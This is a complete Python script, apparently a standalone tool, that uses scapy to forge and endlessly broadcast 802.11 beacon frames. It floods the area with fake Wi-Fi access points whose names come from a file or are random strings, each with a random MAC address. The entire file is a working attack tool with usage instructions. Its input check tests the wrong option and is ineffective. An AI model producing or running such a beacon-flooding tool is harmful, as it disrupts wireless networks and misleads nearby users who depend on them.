#python3
import argparse
import random
import string
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump,RandMAC

def randomString(stringLength=8):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


parser = argparse.ArgumentParser(prog="SSID flood attack script",
								 usage=" python3 SSIDFlood.py -f [filename] -i [interface]\n" +
								 	   "\tpython3 SSIDFLood.py -n [number of SSID] -i [interface]",
							 	 allow_abbrev=False)

parser.add_argument("-f", "--Filename", required=False, help="Name of file that contains list of SSID")
parser.add_argument("-i", "--Interface", required=True, help="Interface from which you want to send packets, needs to be set to monitor mode ")
parser.add_argument("-n", "--Number", required=False, help="Number of random generated SSID")

args = parser.parse_args()
if not (args.Filename or args.Interface) :
	parser.error('No file or number provided, use either -n or -f')

listSSID = [] # 2 ways of filling listSSID : either with a provided list or with randomly generated name
if(args.Filename):
	f = open(args.Filename, 'r')
	listSSID = f.readlines()
	f.close()
else:
	for i in range(0, int(args.Number)):
		listSSID.append(randomString())

iface = args.Interface
frame = []


for i in listSSID:
	print(i) 														#print the SSID so the user knows which wifi has been created
	randMac = RandMAC()												#generate a random mac address for each wifi
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',  	#addr1 : destination MAC address, in this case broadcast. addr2 : Source MAC address of the sender. 
	addr2=randMac, addr3=randMac)									#addr3 : MAC address of the AP
	beacon = Dot11Beacon(cap='ESS+privacy')
	essid = Dot11Elt(ID='SSID',info=i, len=len(i))					#adding information relative to the wifi : SSID
	
	newf = RadioTap()/dot11/beacon/essid							#concatenate everything
	frame.append(newf)												#add the constructed frame to the table of frames

sendp(frame, iface=iface, inter=0.0000000001, loop=1)				#send all frames inside the table frame with a really low inter to be sure that the signal will be constant.
